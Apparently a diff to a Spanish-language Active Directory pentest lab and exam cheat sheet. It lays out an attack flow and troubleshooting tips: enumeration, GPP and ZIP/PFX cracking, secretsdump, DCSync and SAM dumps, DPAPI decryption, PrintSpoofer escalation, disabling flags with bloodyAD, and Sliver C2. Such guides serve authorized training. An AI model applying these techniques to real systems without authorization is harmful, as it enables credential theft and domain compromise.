+> **Si el lab/examen pide específicamente el hash NTLM** (no solo la flag en texto) **de una cuenta LOCAL** (no de dominio) → usa el volcado local de SAM/SYSTEM de la Fase 5g (`reg save` + `secretsdump ... LOCAL`), no DCSync — son técnicas distintas para objetivos distintos.
+
 ---
 
 ## Resumen del flujo completo
 
 ```
 nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
-   → enumeración SIN creds (null session, RPC anónimo, shares, WEB si hay puerto 80)
+   → enumeración SIN creds (null session, RPC anónimo, lookupsid, shares, WEB si hay puerto 80)
    → ¿GPP/Groups.xml? → gpp-decrypt → credencial #1
    → ¿ZIP/PFX en un share? → zip2john/pfx2john + john → openssl extrae cert+key
      → evil-winrm -c cert.pem -k key.pem -S (autenticación por certificado)
+   → revisa TAMBIÉN: notas de onboarding en shares, campo "Description" de usuarios
+     (nxc --users), scripts .ps1 con creds hardcodeadas — cada cred nueva → probar
+     contra shares nuevos (patrón: cred → share nuevo → script → otra cred → shell)
    → enumeración CON creds (nxc, LDAP con filtros, RPC — CRUZA AMBAS fuentes)
    → BloodHound (verificar arranque con pg_lsclusters si no responde)
    → priorizar camino: ACL > Kerberos > Sesión
    → ejecutar técnica del camino elegido → nueva credencial/acceso
    → movimiento lateral (evil-winrm/psexec/wmiexec — confirmar puerto Y si es 5986 usar -S)
-   → si WinRM autoriza mal: sospechar grupo "Remote Management Users"
+   → si WinRM autoriza mal: sospechar grupo "Remote Management Users" o ACCOUNTDISABLE
+   → ¿carpetas Credentials\/Protect\<SID>\ en vez de flag directa? → DPAPI (impacket-dpapi
+     masterkey + credential) — si evil-winrm download falla (EstandardError) con esos
+     archivos Hidden+System, usa Sliver C2 como shell alternativa solo para ese paso
    → revisar ConsoleHost_history.txt (PowerShell) — a veces hay password en texto plano
    → winPEAS (servir desde carpeta correcta, IP de VPN, convertir UTF-16→UTF-8 antes de grep)
    → ¿autologin encontrado? CRUZAR contra directorios reales en C:\Users (nombre puede diferir)
@@ -937,3 +1404,11 @@ nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
 10. **¿`whoami /priv` muestra un privilegio interesante (`SeBackupPrivilege`, etc.) pero `type`/`download` da "Access denied" o trae el archivo vacío?** → un privilegio "Enabled" NO se aplica solo; necesitas una herramienta que invoque explícitamente esa semántica (ej: `robocopy /B` para SeBackupPrivilege). No descartes el privilegio solo porque el comando obvio falló.
 11. **¿`certipy` no encuentra la vulnerabilidad que esperabas, o falla de forma rara?** → actualiza a la versión más reciente antes de asumir que la técnica no aplica (`pip install certipy-ad --upgrade --break-system-packages`); versiones viejas no detectan correctamente varias ESC (incluida ESC16).
 12. **¿Un comando de Kerberos/certipy falla por error de tiempo/reloj (`KRB_AP_ERR_SKEW` o similar)?** → antepón `faketime` sincronizado con el reloj del DC al comando completo: `faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" <comando>`. Los certificados son mucho más estrictos con la hora que NTLM normal.
+13. **¿`get`/`cat` de un archivo da "not found" aunque `ls` lo muestre claramente?** → el nombre probablemente tiene espacios; ponlo completo entre comillas (`get "archivo con espacios.txt"`, `cat 'archivo con espacios.txt'`). Y no olvides mirar la columna "Description" cuando corras `nxc --users` — a veces la credencial está ahí, no en ningún archivo.
+14. **¿Tu terminal se queda colgada en `dquote>` o `>` al escribir un comando con un password?** → usaste comillas dobles con un password que tiene `!`/`$`/`` ` ``. Cierra con una comilla sola + Enter (o Ctrl+C), y reintenta TODO el bloque de usuario/password con comillas SIMPLES `'...'`.
+15. **¿WinRM da `WinRMAuthorizationError` incluso después de confirmar que el usuario SÍ está en "Remote Management Users"?** → puede ser la cuenta deshabilitada (`ACCOUNTDISABLE` en `userAccountControl`), no un problema de grupo. Verifica desde otra cuenta con acceso y, si tienes ACL suficiente, quita la bandera con `bloodyAD ... remove uac '<cuenta>' -f ACCOUNTDISABLE`.
+16. **¿evil-winrm `download`/`upload` falla con `EstandardError` (sí, con ese typo) en vez de `StandardError`?** → bug conocido de evil-winrm con archivos Hidden+System (típico de blobs/masterkeys DPAPI). No es tu sintaxis. Usa Sliver C2 como shell alternativa solo para esa transferencia (Fase 6b).
+17. **¿Encontraste carpetas `Credentials\` o `Protect\<SID>\` con archivos dentro, en vez de una flag directa?** → es DPAPI (Fase 5h): un usuario guardó la credencial de OTRA cuenta en su Credential Manager. Necesitas el blob (`Credentials\`) Y la masterkey (`Protect\<SID>\`), y la password del usuario dueño para descifrar la masterkey con `impacket-dpapi masterkey`, antes de descifrar el blob con `impacket-dpapi credential`.
+18. **¿`whoami /priv` muestra `SeImpersonatePrivilege` en `Enabled`?** → es privesc local directo a SYSTEM vía PrintSpoofer (Fase 6c), no tiene nada que ver con AD/dominio. Revisa esto SIEMPRE apenas tengas shell nueva, antes de cualquier otra cosa — es gratis y muy común en cuentas de servicio/aplicación.
+19. **¿Dejaste un placeholder tipo `<TU_IP_VPN>`, `<NOMBRE_EXACTO>` o `<RUTA_MYSQL.EXE>` literal dentro de un comando?** → revisa el output con cuidado antes de reintentar: un comando con un placeholder sin sustituir a veces "corre" sin error visible (sobre todo si usa `<`/`>` dentro de una ruta en `cmd.exe`, que los interpreta como redirección y rompe todo silenciosamente) y el archivo de salida queda con contenido viejo de una ejecución anterior, lo cual puede confundirte pensando que el comando nuevo no hizo nada.
+20. **¿Estás pivotando con proxychains y `nmap`/`ntpdate`/`bloodhound-python` fallan o dan "todo filtered"/timeout?** → proxychains solo tuneliza TCP, no UDP, y `nmap` con paralelismo alto da falsos negativos sobre un túnel SOCKS de un solo canal. Usa `nc -nvz`/`nxc` para confirmar puertos, `faketime` con timestamp calculado en vez de `ntpdate`, y `--dns-tcp` en `bloodhound-python` (Fase 6d tiene el detalle completo).
